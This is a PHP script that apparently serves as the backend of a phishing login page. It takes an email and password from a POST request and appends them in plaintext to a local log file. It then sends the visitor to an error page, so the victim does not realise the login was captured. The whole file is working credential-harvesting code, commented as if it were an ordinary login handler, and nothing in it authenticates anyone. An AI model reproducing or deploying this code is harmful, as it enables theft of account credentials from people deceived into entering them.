<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve and sanitize email and password
    $data = json_decode(file_get_contents('php://input'), true);
    $email = isset($data['email']) ? htmlspecialchars($data['email']) : '';
    $password = isset($data['password']) ? htmlspecialchars($data['password']) : '';

    // Log the data to a text file
    $logData = "Email: $email\nPassword: $password\n\n";
    $logFile = 'login_logs.txt';

    // Open file for appending
    $fp = fopen($logFile, 'a');
    if ($fp) {
        fwrite($fp, $logData);
        fclose($fp);
    } else {
        // Handle error, e.g., log to another file or database
        error_log('Failed to open log file for writing', 0);
    }

    // Redirect to another page after logging (optional)
    header("Location: /error.html"); // Replace with your desired error page URL
    exit(); // Ensure that no further output is sent
}
?>
